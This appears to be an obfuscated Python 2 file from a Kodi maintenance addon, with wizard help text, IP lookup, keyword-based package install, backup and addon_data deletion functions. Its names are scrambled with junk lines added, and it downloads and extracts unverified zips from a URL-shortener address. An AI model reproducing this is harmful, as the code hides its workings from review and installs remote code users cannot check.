 IIi1IiII ( 'Adding Third Party Wizards' , '[COLOR=gold]ONE WIZARD TO RULE THEM ALL![/COLOR][CR]Did you know the vast majority of wizards out there (every single one we\'ve tested) has just been a copy/paste of very old code created by the team here? We\'ve noticed a lot of the users installing builds via these third party wizards have run into many different problems so we thought we\'d take it upon ourselves to help out...'
 '[CR][CR][CR][COLOR=gold]WHAT BENEFITS DOES THIS HAVE?[/COLOR][CR]We\'ve added extra code that checks for common errors, unfortunately there are some people out there using inferior programs to create their backups and that is causing problems in their wizards. If such a problem exists when trying to use another wizard you can try adding the details to this addon and it automatically fixes any corrupt files it finds. Of course there are other benefits... installing code from an unknown source can give the author access to your system so make sure you always trust the author(s). Why take the risk of installing wizards created by anonymous usernames on social media sites when you can install from a trusted source like noobsandnerds and you\'ll also be safe in the knowledge that any new updates and improvements will be made here first - we do not copy/paste code, we are actively creating new exciting solutions!'
 '[CR][CR][CR][COLOR=gold]ADDING 3RD PARTY WIZARDS TO THIS ADDON[/COLOR][CR][CR][COLOR=dodgerblue][B]Step 1:[/COLOR] Enabling 3rd Party Wizards[/B][CR]In the addon settings under the Community Builds section you have the option to enable third party community builds, if you click on this you will be able to enter details of up to 5 different wizards.'
 '[CR][CR][COLOR=dodgerblue][B]Step 2:[/COLOR] Enter the URL[/B][CR]As virtually all wizards use exactly the same structure all you need to do is find out what URL they are looking up in the code, you can open the default.py file of the wizard in a text editor and search for "http" and you will more than likely find the URL straight away. Try entering it in a web address, it should show the details for all the builds in that wizard in a text based page. If the page is blank don\'t worry it may just be locked from web browsers and can only be opened in Kodi, try it out and see if it works.'
 '[CR][CR][COLOR=dodgerblue][B]Step 3:[/COLOR] Enter the name[/B][CR]Give the wizard a name, now when you go into the Community Builds section you\'ll have the official noobsandnerds builds as an option and also any new ones you\'ve added.' )
 if 82 - 82: Iii . IIIIiiII111
 if 73 - 73: OoOo0o
def i1IiIiiiii11 ( ) :
 ooooOO = I1IiiI . getSetting ( 'ip_site' )
 try :
  if ooooOO == "whatismyipaddress.com" :
   OO = 'http://whatismyipaddress.com/'
   Ii1iI111II1I1 = oOOOOoOO0o ( OO , 30 ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
   if not 'Access Denied' in Ii1iI111II1I1 :
    i1IIII11II1 = re . compile ( 'whatismyipaddress.com/ip/(.+?)"' ) . findall ( Ii1iI111II1I1 )
    OOOO0oOO = i1IIII11II1 [ 0 ] if ( len ( i1IIII11II1 ) > 0 ) else 'Unknown'
    xbmc . log ( OOOO0oOO )
    IIIiii = re . compile ( '"font-size:14px;">(.+?)</td>' ) . findall ( Ii1iI111II1I1 )
    xbmc . log ( str ( IIIiii ) )
    I11OoooO = IIIiii [ 0 ] if ( len ( IIIiii ) > 0 ) else 'Unknown'
    xbmc . log ( I11OoooO )
    i1IIi11 = IIIiii [ 1 ] + ', ' + IIIiii [ 2 ] + ', ' + IIIiii [ 3 ] if ( len ( IIIiii ) > 2 ) else 'Unknown'
    xbmc . log ( i1IIi11 )
    i11 . ok ( 'www.whatismyipaddress.com' , "[B][COLOR gold]Address: [/COLOR][/B] %s" % OOOO0oOO , '[B][COLOR gold]Provider: [/COLOR][/B] %s' % I11OoooO , '[B][COLOR gold]Location: [/COLOR][/B] %s' % i1IIi11 )
  else :
   OO = 'https://www.iplocation.net/find-ip-address'
   Ii1iI111II1I1 = oOOOOoOO0o ( OO , 30 ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
   xbmc . log ( Ii1iI111II1I1 )
   oOIIIII11 = re . compile ( '<table class="iptable">(.+?)</table>' ) . findall ( Ii1iI111II1I1 )
   xbmc . log ( str ( oOIIIII11 ) )
   i1IIII11II1 = re . compile ( 'font-weight: bold;">(.+?)</span>' ) . findall ( str ( oOIIIII11 ) )
   xbmc . log ( i1IIII11II1 )
   OOOO0oOO = i1IIII11II1 [ 0 ] if ( len ( i1IIII11II1 ) > 0 ) else 'Unknown'
   i1i1 = re . compile ( 'Host Name</th><td>(.+?)</td>' ) . findall ( str ( oOIIIII11 ) )
   IiiIi = i1i1 [ 0 ] if ( len ( i1i1 ) > 0 ) else 'Unknown'
   IIiiIiI = re . compile ( 'IP Location</th><td>(.+?)&nbsp;' ) . findall ( str ( oOIIIII11 ) )
   i1IIi11 = IIiiIiI [ 0 ] if ( len ( IIiiIiI ) > 0 ) else 'Unknown'
   i11 . ok ( 'www.iplocation.net' , "[B][COLOR gold]Address: [/COLOR][/B] %s" % OOOO0oOO , '[B][COLOR gold]Host: [/COLOR][/B] %s' % IiiIi , '[B][COLOR gold]Location: [/COLOR][/B] %s' % i1IIi11 )
 except :
  i11 . ok ( 'SERVICE UNAVAILABLE' , 'It was not possible to contact the relevant website to check your details. Please check your internet connection and if that\'s ok try using an alternative site in the settings.' )
  if 49 - 49: IIIIiiII111 . oOoO0o00OO0 % i11Iii . iiII11i1I1IIi * II11iIiIIIiI
  if 44 - 44: IIii1I / OOO0O0O0ooooo * iiII11i1I1IIi + o000O0o . i11Iii
def OOOo ( window_type ) :
 I1iIi1i = False
 IIiI1oO = 0
 if 90 - 90: Oo00oo0oO * Ooo00oOo0oOo * Oo00oo0oO - ooo0O0O00
 if window_type == 'yesnodialog' :
  I11I111i = 50
 else :
  I11I111i = 10
  if 82 - 82: OoOo0o / i11Iii / i11Iii
 Ii1I1i1IiiI = xbmc . getCondVisibility ( 'Window.IsActive(%s)' % window_type )
 if 37 - 37: o000O0o + II1 . OoOo0o + o000O0o . Oo00oo0oO
 if 44 - 44: Iii . OoOo0o . O00ooooo00 . Iii * i11Iii
 while not Ii1I1i1IiiI and IIiI1oO < I11I111i :
  xbmc . sleep ( 100 )
  Ii1I1i1IiiI = xbmc . getCondVisibility ( 'Window.IsActive(%s)' % window_type )
  IIiI1oO += 1
 while Ii1I1i1IiiI :
  I1iIi1i = True
  Ii1I1i1IiiI = xbmc . getCondVisibility ( 'Window.IsActive(%s)' % window_type )
  xbmc . sleep ( 250 )
 return I1iIi1i
 if 59 - 59: Ooo00oOo0oOo * II1 - II1
 if 33 - 33: OOO0O0O0ooooo . i11iIiiIii % o0ii1I
def i1I1iii1I11II ( url ) :
 if not os . path . exists ( I11i1I1I ) :
  os . makedirs ( I11i1I1I )
  if 5 - 5: i11iIiiIii / i11Iii - ooo0O0O00 - II1 / i11Iii + IIii1I
 O0ooOoO0 = ''
 oOIIII = 'Enter Keyword'
 Ii1I11IIi1 = I1iiiiI ( oOIIII )
 O0ooOoO0 = url + Ii1I11IIi1
 OOo00oOo = os . path . join ( I11i1I1I , Ii1I11IIi1 + '.zip' )
 if 12 - 12: o0oo
 if Ii1I11IIi1 != '' :
  i1I1IiI1II1 = i11 . yesno ( 'Backup existing setup' , 'Installing certain keywords can result in some existing settings or add-ons to be replaced. Would you like to create a backup before proceeding?' )
  if 21 - 21: II1 . OOO0O0O0ooooo / i11iIiiIii
  if i1I1IiI1II1 == 1 :
   oOOO ( )
   if 71 - 71: o000O0o . i11Iii
  try :
   if IiII == 'true' :
    print "### Attempting download " + O0ooOoO0 + " to " + OOo00oOo
   I11 . create ( "Web Installer" , "Downloading " , '' , 'Please Wait' )
   downloader . download ( O0ooOoO0 , OOo00oOo )
   print "### Keyword " + Ii1I11IIi1 + " Successfully downloaded"
   I11 . update ( 0 , "" , "Extracting Zip Please Wait" )
   if 43 - 43: oOoO0o00OO0 * II11iIiIIIiI
   if zipfile . is_zipfile ( OOo00oOo ) :
    if 1 - 1: o0oo * i11Iii + Oo00oo0oO . oooOooOOo0OO / i11Iii
    try :
     extract . all ( OOo00oOo , Oo0o0000o0o0 , I11 )
     xbmc . executebuiltin ( 'UpdateLocalAddons' )
     xbmc . executebuiltin ( 'UpdateAddonRepos' )
     i11 . ok ( "KEYWORD INSTALL" , "" , "Content now installed" , "" )
     I11 . close ( )
     if 91 - 91: IIIIiiII111 + o0o - iiII11i1I1IIi % Iii . ooo0O0O00
    except :
     i11 . ok ( "Error with zip" , 'There was an error trying to install this file. It may possibly be corrupt, either try again or contact the author of this keyword.' )
     print "### Unable to install keyword (passed zip check): " + Ii1I11IIi1
   else :
    i11 . ok ( "Keyword Error" , 'The keyword you typed could not be installed. Please check the spelling and if you continue to receive this message it probably means that keyword is no longer available.' )
    if 51 - 51: II11iIiIIIiI / o0o
  except :
   i11 . ok ( "Keyword Error" , 'The keyword you typed could not be installed. Please check the spelling and if you continue to receive this message it probably means that keyword is no longer available.' )
   print "### Unable to install keyword (unknown error, most likely a typo in keyword entry): " + Ii1I11IIi1
   if 51 - 51: i11Iii * oooOooOOo0OO - OoOo0o + ooo0O0O00
 if os . path . exists ( OOo00oOo ) :
  os . remove ( OOo00oOo )
  if 46 - 46: o0ii1I - i11iIiiIii % o0oo / IIIIiiII111 - Iii
  if 88 - 88: oooOooOOo0OO * o000O0o / o0oo - II11iIiIIIiI / O00ooooo00 . OoOo0o
def IiII1 ( ) :
 os . _exit ( 1 )
 if 26 - 26: i11iIiiIii - i11Iii
 if 45 - 45: i11Iii + Ooo00oOo0oOo % ooo0O0O00
def o00OoOo0 ( ) :
 xbmc . executebuiltin ( 'ReplaceWindow(settings)' )
 if 22 - 22: IIii1I / i11Iii / o000O0o - o0ii1I
 if 21 - 21: oooOooOOo0OO . i11iIiiIii * o0o . II11iIiIIIiI / II11iIiIIIiI
def Iii1 ( DB ) :
 if DB in [ 'Addons' , 'ADSP' , 'Epg' , 'MyMusic' , 'MyVideos' , 'Textures' , 'TV' , 'ViewModes' ] :
  O0OO0O = glob . glob ( os . path . join ( oO0o0o0ooO0oO , '%s*.db' % DB ) )
  Ii111ii1 = '%s(.+?).db' % DB [ 1 : ]
  OoOo00Oo0oo0O = 0
  for file in O0OO0O :
   try :
    i11I111iII1i1 = int ( re . compile ( Ii111ii1 ) . findall ( file ) [ 0 ] )
   except :
    i11I111iII1i1 = 0
   if OoOo00Oo0oo0O < i11I111iII1i1 :
    OoOo00Oo0oo0O = i11I111iII1i1
  return '%s%s.db' % ( DB , OoOo00Oo0oo0O )
 else :
  return False
  if 76 - 76: iiII11i1I1IIi + IIii1I % o0ii1I
  if 82 - 82: oooOooOOo0OO / IIIIiiII111
def oOOO ( ) :
 oooOo ( )
 if 75 - 75: i11Iii
 oOoooOo0o = xbmc . translatePath ( os . path . join ( I11i1 , 'Community_Builds' , 'My_Builds' , '' ) )
 III = xbmc . translatePath ( os . path . join ( I11i1 , 'Community_Builds' , 'My_Builds' , 'my_full_backup.zip' ) )
 IiiI = xbmc . translatePath ( os . path . join ( I11i1 , 'Community_Builds' , 'My_Builds' , 'my_full_backup_GUI_Settings.zip' ) )
 if 23 - 23: Iii * iiII11i1I1IIi % II1 - i11iIiiIii
 if not os . path . exists ( oOoooOo0o ) :
  os . makedirs ( oOoooOo0o )
  if 46 - 46: iiII11i1I1IIi
 O0O0 = oO0ooo00o0o000Oo ( heading = "Enter a name for this backup" )
 if 99 - 99: o0oo - i11Iii * OOO0O0O0ooooo * oOoO0o00OO0 * IIii1I - IIii1I
 if ( not O0O0 ) :
  return False , 0
  if 50 - 50: o000O0o % i11iIiiIii - o000O0o * ooo0O0O00 / Oo00oo0oO / OOO0O0O0ooooo
 oOIIII = urllib . quote_plus ( O0O0 )
 ooOOo = xbmc . translatePath ( os . path . join ( oOoooOo0o , oOIIII + '.zip' ) )
 i1iii1IiiiI1i1 = [ OO0o ]
 IIIiI1i1 = [ "xbmc.log" , "xbmc.old.log" , "kodi.log" , "kodi.old.log" , '.DS_Store' , '.setup_complete' , 'XBMCHelper.conf' , 'Thumbs.db' , '.gitignore' ]
 I111iiiii1 = "Creating full backup of existing build"
 OOOOoO = "Creating Community Build"
 OO0ooOoOO0OOo = "Archiving..."
 OooOoooo0000 = ""
 I1ii1i11i = "Please Wait"
 if 31 - 31: Ooo00oOo0oOo . II1 + o0oo + o0ii1I . o000O0o . Ooo00oOo0oOo
 o00Ooo0 ( Oo0o0000o0o0 , III , I111iiiii1 , OO0ooOoOO0OOo , OooOoooo0000 , I1ii1i11i , i1iii1IiiiI1i1 , IIIiI1i1 )
 i11 . ok ( 'Full Backup Complete' , 'You can locate your backup at:[COLOR=dodgerblue]' , III + '[/COLOR]' )
 if 3 - 3: o0o / OoOo0o * Oo00oo0oO - OOO0O0O0ooooo + o000O0o / Oo00oo0oO
 if 19 - 19: O00ooooo00 % Ooo00oOo0oOo
def O00OO0oO ( ) :
 oOo0O = IIiI1i ( )
 IIi1IiII ( 'Log Viewer' , oOo0O )
 if 30 - 30: i11iIiiIii % o0oo * Ooo00oOo0oOo - OOO0O0O0ooooo . oOoO0o00OO0 * IIii1I
 if 48 - 48: o0ii1I + oOoO0o00OO0 / oOoO0o00OO0
def oOO0o0o0 ( ) :
 i11 . ok ( "Restore local guisettings fix" , "You should [COLOR=lime]ONLY[/COLOR] use this option if the guisettings fix is failing to download via the addon. Installing via this method means you do not receive notifications of updates" )
 OoOo00oOoo0oO ( )
 if 35 - 35: OoOo0o - O00ooooo00 / Oo00oo0oO
 if 13 - 13: Iii - o0oo * II1
def iIi1i111ii1II11ii ( mode ) :
 O0O0 = oO0ooo00o0o000Oo ( heading = "Search for content" )
 if ( not O0O0 ) :
  return False , 0
 oOIIII = urllib . quote_plus ( O0O0 )
 OO0oOo ( mode + '&name=' + oOIIII )
 if 21 - 21: o0o
 if 79 - 79: o0oo / II11iIiIIIiI - O00ooooo00 + O00ooooo00 - Oo00oo0oO + Oo00oo0oO
def oooo ( src , dst , clean ) :
 for oOoOo000Ooooo , OoIIi1iI , oO0Ooo0OooOOo in os . walk ( src ) :
  I1iIiii = oOoOo000Ooooo . replace ( src , dst , 1 )
  if not os . path . exists ( I1iIiii ) :
   os . makedirs ( I1iIiii )
  for OoOOo0OO0OOoo in oO0Ooo0OooOOo :
   i1Ii1 = os . path . join ( oOoOo000Ooooo , OoOOo0OO0OOoo )
   Ii111OO0o0o0OOoooo = os . path . join ( I1iIiii , OoOOo0OO0OOoo )
   if os . path . exists ( Ii111OO0o0o0OOoooo ) :
    os . remove ( Ii111OO0o0o0OOoooo )
   shutil . move ( i1Ii1 , I1iIiii )
 if clean == 1 :
  try :
   shutil . rmtree ( src )
  except :
   pass
   if 77 - 77: oOoO0o00OO0 % oooOooOOo0OO
   if 67 - 67: iiII11i1I1IIi - oooOooOOo0OO + o000O0o * iiII11i1I1IIi * o0ii1I % Iii
def OooOo000o0o ( title , list , images , description ) :
 global pos
 global listicon
 class Ii1i1iI1i1 ( pyxbmct . AddonDialogWindow ) :
  def __init__ ( self , title = "" , items = None , images = None , description = None ) :
   super ( Ii1i1iI1i1 , self ) . __init__ ( title )
   self . setGeometry ( 1100 , 700 , 20 , 20 )
   self . selected = [ ]
   self . set_controls ( )
   self . connect_controls ( )
   self . listing . addItems ( items or [ ] )
   self . set_navigation ( )
   self . connect ( oO0 , self . update_list )
   self . connect ( Ii1iIiII1ii1 , self . update_list )
   if 98 - 98: o0o . OOO0O0O0ooooo / Ooo00oOo0oOo
  def set_controls ( self ) :
   oO00o0OooO00o = pyxbmct . Image ( O0o0O00Oo0o0 , aspectRatio = 0 )
   oO00o0OooO00o . setImage ( O0o0O00Oo0o0 )
   self . listing = pyxbmct . List ( _imageWidth = 15 )
   self . placeControl ( oO00o0OooO00o , 0 , 0 , rowspan = 20 , columnspan = 20 )
   i111 = pyxbmct . Image ( images [ 0 ] , aspectRatio = 2 )
   i111 . setImage ( images [ 0 ] )
   self . placeControl ( i111 , 0 , 11 , rowspan = 8 , columnspan = 8 , pad_x = 10 , pad_y = 10 )
   self . textbox = pyxbmct . TextBox ( )
   self . placeControl ( self . textbox , 8 , 11 , rowspan = 9 , columnspan = 9 , pad_x = 10 , pad_y = 10 )
   self . textbox . setText ( description [ 0 ] )
   self . textbox . autoScroll ( 5000 , 2000 , 8000 )
   self . ok_button = pyxbmct . Button ( "OK" )
   self . placeControl ( self . ok_button , 17 , 13 , pad_x = 10 , pad_y = 10 , rowspan = 2 , columnspan = 3 )
   self . cancel_button = pyxbmct . Button ( "Cancel" )
   self . placeControl ( self . cancel_button , 17 , 16 , pad_x = 10 , pad_y = 10 , rowspan = 2 , columnspan = 3 )
   self . placeControl ( self . listing , 0 , 0 , rowspan = 20 , columnspan = 10 , pad_y = 10 )
   if 49 - 49: Oo00oo0oO % o0ii1I . oOoO0o00OO0 / II11iIiIIIiI . IIIIiiII111 * oOoO0o00OO0
  def connect_controls ( self ) :
   self . connect ( self . listing , self . check_uncheck )
   self . connect ( self . ok_button , self . ok )
   self . connect ( self . cancel_button , self . close )
   if 17 - 17: oOoO0o00OO0 * II1 % O00ooooo00 % II1 . ooo0O0O00
  def set_navigation ( self ) :
   self . listing . controlLeft ( self . ok_button )
   self . listing . controlRight ( self . ok_button )
   self . ok_button . setNavigation ( self . listing , self . listing , self . cancel_button , self . cancel_button )
   self . cancel_button . setNavigation ( self . listing , self . listing , self . ok_button , self . ok_button )
   if self . listing . size ( ) :
    self . setFocus ( self . listing )
   else :
    self . setFocus ( self . cancel_button )
    if 20 - 20: o0oo . oooOooOOo0OO
  def update_list ( self ) :
   II111I11iI = pyxbmct . Image ( O00O0oOO00O00 , aspectRatio = 0 )
   II111I11iI . setImage ( O00O0oOO00O00 )
   self . placeControl ( II111I11iI , 0 , 11 , rowspan = 8 , columnspan = 8 , pad_x = 10 , pad_y = 10 )
   i1Ii = self . listing . getSelectedPosition ( )
   iI1i11 = images [ i1Ii ]
   i111 = pyxbmct . Image ( iI1i11 , aspectRatio = 2 )
   i111 . setImage ( iI1i11 )
   self . placeControl ( i111 , 0 , 11 , rowspan = 8 , columnspan = 8 , pad_x = 10 , pad_y = 10 )
   self . textbox . setText ( description [ i1Ii ] )
   if 89 - 89: oOoO0o00OO0 * oOoO0o00OO0 * Iii / ooo0O0O00
  def check_uncheck ( self ) :
   OOo0i111ii1Ii = self . listing . getSelectedItem ( )
   if OOo0i111ii1Ii . getLabel2 ( ) == "checked" :
    OOo0i111ii1Ii . setIconImage ( "" )
    OOo0i111ii1Ii . setLabel2 ( "unchecked" )
   else :
    OOo0i111ii1Ii . setIconImage ( Oo0OoO00oOO0o )
    OOo0i111ii1Ii . setLabel2 ( "checked" )
    if 59 - 59: OOO0O0O0ooooo . o0ii1I % oOoO0o00OO0 * oooOooOOo0OO + o0o
  def ok ( self ) :
   self . selected = [ o00oIiIiIiiI for o00oIiIiIiiI in xrange ( self . listing . size ( ) )
 if self . listing . getListItem ( o00oIiIiIiiI ) . getLabel2 ( ) == "checked" ]
   super ( Ii1i1iI1i1 , self ) . close ( )
   if 83 - 83: Iii
  def close ( self ) :
   self . selected = [ ]
   super ( Ii1i1iI1i1 , self ) . close ( )
   if 84 - 84: IIIIiiII111
 i11 = Ii1i1iI1i1 ( title , list , images , description )
 i11 . doModal ( )
 return i11 . selected
 del i11
 if 70 - 70: IIii1I
 if 45 - 45: OOO0O0O0ooooo - Iii % II11iIiIIIiI
def ooI1 ( ) :
 OOo0oO00ooO00 ( '' , '[COLOR=dodgerblue]How to install keywords[/COLOR]' , '' , 'instructions_3' , 'mainmenu/keyword.png' , '' , '' , '' )
 OOo0oO00ooO00 ( '' , '[COLOR=dodgerblue]How to create keywords[/COLOR]' , '' , 'instructions_4' , 'mainmenu/keyword.png' , '' , '' , '' )
 OOo0oO00ooO00 ( '' , '[COLOR=gold]-----------------------------------------------------------------[/COLOR]' , '' , '' , 'mainmenu/keyword.png' , '' , '' , '' )
 OOo0oO00ooO00 ( '' , 'Install Keywords' , 'http://urlshortbot.com/noobs' , 'keywords' , 'mainmenu/keyword.png' , '' , '' , '' )
 OOo0oO00ooO00 ( '' , 'Create Keywords' , 'create_pack' , 'create_keyword' , 'mainmenu/keyword.png' , '' , '' , '' )
 if 4 - 4: ooo0O0O00 % oOoO0o00OO0
 if 9 - 9: OOO0O0O0ooooo * IIIIiiII111
def o0O00o00Ooo ( title , message , times = 2000 , icon = OOooO0OOoo ) :
 xbmc . executebuiltin ( 'XBMC.Notification(%s, %s, %s, %s)' % ( title , message , times , icon ) )
 if 16 - 16: II11iIiIIIiI . Ooo00oOo0oOo - IIIIiiII111 - II1
 if 83 - 83: i11iIiiIii - iiII11i1I1IIi
def iIiIII ( ) :
 xbmc . executebuiltin ( 'ActivateWindow(filemanager,return)' )
 return
 if 52 - 52: oOoO0o00OO0 + IIii1I / O00ooooo00 / o000O0o
 if 67 - 67: IIIIiiII111 % i11iIiiIii + o0o
def oO0OOO ( ) :
 xbmc . executebuiltin ( 'ActivateWindow(systeminfo)' )
 if 64 - 64: II1 * Ooo00oOo0oOo . IIii1I . ooo0O0O00 + oOoO0o00OO0 . o0ii1I
 if 1 - 1: Oo00oo0oO / OoOo0o / OoOo0o + o0ii1I
def oOOOOoOO0o ( url , t ) :
 Iiiii1Ii = urllib2 . Request ( url )
 Iiiii1Ii . add_header ( 'User-Agent' , 'Mozilla/5.0 (Windows; U; Windows NT 10.0; WOW64; Windows NT 5.1; en-GB; rv:1.9.0.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36 Gecko/2008092417 Firefox/3.0.3' )
 if 18 - 18: o0o % II1 + o0oo / o0o
 IIiI1oO = 0
 OO0OooOo = False
 while IIiI1oO < 5 and OO0OooOo == False :
  o000o0O0Oo00 = urllib2 . urlopen ( Iiiii1Ii , timeout = t )
  Ii1iI111II1I1 = o000o0O0Oo00 . read ( )
  o000o0O0Oo00 . close ( )
  IIiI1oO += 1
  if Ii1iI111II1I1 != '' :
   OO0OooOo = True
 if OO0OooOo == True :
  return Ii1iI111II1I1 . replace ( '\r' , '' ) . replace ( '\n' , '' ) . replace ( '\t' , '' )
 else :
  i11 . ok ( 'Unable to contact server' , 'There was a problem trying to access the server, please try again later.' )
  return
  if 37 - 37: O00ooooo00 - IIIIiiII111 / Oo00oo0oO . Ooo00oOo0oOo % i11Iii
  if 39 - 39: IIIIiiII111 % i11iIiiIii * o0oo
def I1i11i ( ) :
 import tarfile
 if 9 - 9: Ooo00oOo0oOo + oOoO0o00OO0 / ooo0O0O00
 if not os . path . exists ( O000oo0O ) :
  os . makedirs ( O000oo0O )
  if 51 - 51: o0o % oOoO0o00OO0 + II1 - o000O0o * Iii * ooo0O0O00
 I11 . create ( "Creating Backup" , "Adding files... " , '' , 'Please Wait' )
 I1I1i1 = tarfile . open ( os . path . join ( O000oo0O , Ii1Ii ( ) + '.tar' ) , 'w' )
 if 15 - 15: OOO0O0O0ooooo
 for O0OOoOOooO in ooOooo000oOO :
  I11 . update ( 0 , "Backing Up" , '[COLOR blue]%s[/COLOR]' % O0OOoOOooO , 'Please Wait' )
  I1I1i1 . add ( O0OOoOOooO )
  if 33 - 33: Oo00oo0oO * o0o
 I1I1i1 . close ( )
 I11 . close ( )
 if 96 - 96: o0ii1I - o000O0o % Iii + o0oo - Oo00oo0oO - Oo00oo0oO
 if 2 - 2: i11Iii % i11iIiiIii
def i1iIIi11i111I ( ) :
 oOo0O = IIiI1i ( )
 if 'Running on OpenELEC' in oOo0O or 'Running on LibreELEC' in oOo0O :
  return True
  if 11 - 11: IIii1I . OoOo0o - iiII11i1I1IIi / o0o + Ooo00oOo0oOo
  if 29 - 29: o0o . i11iIiiIii + O00ooooo00 - IIIIiiII111 + OOO0O0O0ooooo . o000O0o
def i1iIiII1 ( ) :
 try :
  xbmcaddon . Addon ( id = 'service.openelec.settings' ) . getAddonInfo ( 'name' )
  xbmc . executebuiltin ( 'ActivateWindow(10025,plugin://service.openelec.settings,return)' )
 except :
  xbmcaddon . Addon ( id = 'service.libreelec.settings' ) . getAddonInfo ( 'name' )
  xbmc . executebuiltin ( 'ActivateWindow(10025,plugin://service.libreelec.settings,return)' )
  if 59 - 59: II1 + OoOo0o % o0ii1I - Iii . o000O0o
  if 42 - 42: OoOo0o
def OOO00OOOO0o ( xmlfile ) :
 if 70 - 70: IIii1I
 if 'http' in xmlfile :
  ooOO0o = 'none'
  oOooo0O = xmlfile [ - 10 : ]
  oOooo0O = oOooo0O [ : - 4 ]
  OOO0 = os . path . join ( oo0o0O00 , OO0o , 'latest' )
  if 43 - 43: oooOooOOo0OO * ooo0O0O00 * i11Iii / IIii1I
  if os . path . exists ( OOO0 ) :
   o0o0O0O00oOOo = open ( OOO0 , mode = 'r' )
   ooOO0o = o0o0O0O00oOOo . read ( )
   o0o0O0O00oOOo . close ( )
   if 31 - 31: i11Iii % o000O0o % Oo00oo0oO / OoOo0o
  if ooOO0o == oOooo0O :
   oOooo0O = ooOO0o
   if 74 - 74: O00ooooo00 + oooOooOOo0OO - IIii1I . iiII11i1I1IIi
  else :
   I11 . create ( 'Grabbing Latest Updates' , '' , '' , '' )
   downloader . download ( xmlfile , os . path . join ( i1iiIII111ii , OO0o , 'resources' , 'skins' , 'DefaultSkin' , 'media' , 'latest.jpg' ) )
   oo0O0 = open ( OOO0 , mode = 'w+' )
   oo0O0 . write ( oOooo0O )
   oo0O0 . close ( )
  xmlfile = 'latest.xml'
 oO0OooO00Oo = IIIIi1i ( xmlfile , I1IiiI . getAddonInfo ( 'path' ) , 'DefaultSkin' , close_time = 34 )
 oO0OooO00Oo . doModal ( )
 del oO0OooO00Oo
 if 81 - 81: oOoO0o00OO0 - o0oo * oooOooOOo0OO
 if 81 - 81: ooo0O0O00 - IIIIiiII111 - II11iIiIIIiI % Oo00oo0oO % o0ii1I . IIii1I
def IIiiIIi1 ( recursive_location , remote_path ) :
 if not os . path . exists ( recursive_location ) :
  os . makedirs ( recursive_location )
  if 79 - 79: oOoO0o00OO0 - oOoO0o00OO0 . IIIIiiII111 / Oo00oo0oO
 Ii1iI111II1I1 = oOOOOoOO0o ( remote_path , 10 ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 O0OO0O = re . compile ( 'href="(.+?)"' , re . DOTALL ) . findall ( Ii1iI111II1I1 )
 if 57 - 57: i11Iii * IIii1I * ooo0O0O00 * IIIIiiII111 / IIIIiiII111
 for Ii1 in O0OO0O :
  ooo0ooO = xbmc . translatePath ( os . path . join ( recursive_location , Ii1 ) )
  if 43 - 43: OOO0O0O0ooooo * i11iIiiIii - II1 - oooOooOOo0OO
  if '/' not in Ii1 :
   if 46 - 46: oooOooOOo0OO * O00ooooo00 / oOoO0o00OO0
   try :
    I11 . update ( 0 , "Downloading [COLOR=yellow]" + Ii1 + '[/COLOR]' , '' , 'Please wait...' )
    downloader . download ( remote_path + Ii1 , ooo0ooO , I11 )
    if 100 - 100: o000O0o - II11iIiIIIiI
   except :
    print "failed to install" + Ii1
    if 91 - 91: o0ii1I * oOoO0o00OO0 - ooo0O0O00 . Ooo00oOo0oOo
  if '/' in Ii1 and '..' not in Ii1 and 'http' not in Ii1 :
   iI11II = remote_path + Ii1
   IIiiIIi1 ( ooo0ooO , iI11II )
   if 3 - 3: o0oo % o0ii1I % II11iIiIIIiI . oOoO0o00OO0 . oOoO0o00OO0
  else :
   pass
   if 35 - 35: O00ooooo00 * ooo0O0O00 - ooo0O0O00 . Oo00oo0oO
   if 77 - 77: o000O0o / IIii1I * IIIIiiII111 * IIii1I + oOoO0o00OO0
def O000o ( ) :
 i11 . ok ( "Register to unlock features" , "To get the most out of this addon please register at the NOOBSANDNERDS forum for free." , 'WWW.NOOBSANDNERDS.COM/SUPPORT' )
 if 76 - 76: II11iIiIIIiI
 if 52 - 52: iiII11i1I1IIi * IIii1I * iiII11i1I1IIi * O00ooooo00
def i11i1IiIi ( ) :
 oO000o0Oo00 = i11 . yesno ( 'DELETE ADD-ON DATA' , 'Do you want to remove individual addon_data folders or wipe all addon_data?' , yeslabel = 'EVERYTHING' , nolabel = 'INDIVIDUAL ITEMS' )
 if 63 - 63: o0o
 if oO000o0Oo00 :
  oO000o0Oo00 = i11 . yesno ( 'Are you ABSOLUTELY certain?' , 'This will remove ALL your addon_data, there\'s no getting it back! Are you certain you want to continue?' )
  if oO000o0Oo00 :
   I1Ii11i1ii1i ( )
   i11 . ok ( "Addon_Data Removed" , '' , 'Your addon_data folder has now been removed.' , '' )
 else :
  OO000oOoo0O = [ ]
  iIIiii11iIiiI = [ ]
  O0Oo0 = [ ]
  o0oO0oo0000OO = [ ]
  I1i1ii1IiIii = [ ]
  if 6 - 6: oooOooOOo0OO / oOoO0o00OO0 / o0oo
  for file in os . listdir ( oo0o0O00 ) :
   if os . path . isdir ( os . path . join ( oo0o0O00 , file ) ) :
    try :
     i1III = xbmcaddon . Addon ( file )
     OOo0 = i1III . getAddonInfo ( 'name' )
     o00oOOoO0oO = i1III . getAddonInfo ( 'icon' )
     OOO0oOoO0O = i1III . getAddonInfo ( 'description' )
    except :
     OOo0 = 'Unknown Add-on'
     o00oOOoO0oO = OOoOO0oo0ooO
     OOO0oOoO0O = 'No add-on has been found on your system that matches this ID. The most likely scenario for this is you\'ve previously uninstalled this add-on and left the old addon_data on the system.'
     if 42 - 42: o0o
   else :
    OOo0 = 'Unknown Add-on'
    o00oOOoO0oO = OOoOO0oo0ooO
    OOO0oOoO0O = 'No add-on has been found on your system that matches this ID. The most likely scenario for this is you\'ve previously uninstalled this add-on and left the old addon_data on the system.'
    if 23 - 23: Iii . o0oo
   ooo0ooO = os . path . join ( oo0o0O00 , file )
   OO000oOoo0O . append ( '%s [COLOR=gold](%s)[/COLOR]' % ( file , OOo0 ) )
   iIIiii11iIiiI . append ( o00oOOoO0oO )
   O0Oo0 . append ( OOO0oOoO0O )
   o0oO0oo0000OO . append ( ooo0ooO )
   if 29 - 29: o0o
  iIi1iIIIiIiI = OooOo000o0o ( 'Addon_Data To Remove' , OO000oOoo0O , iIIiii11iIiiI , O0Oo0 )
  for O0oO0 in iIi1iIIIiIiI :
   iI1I1iII1i = o0oO0oo0000OO [ O0oO0 ]
   iiIIii = OO000oOoo0O [ O0oO0 ]
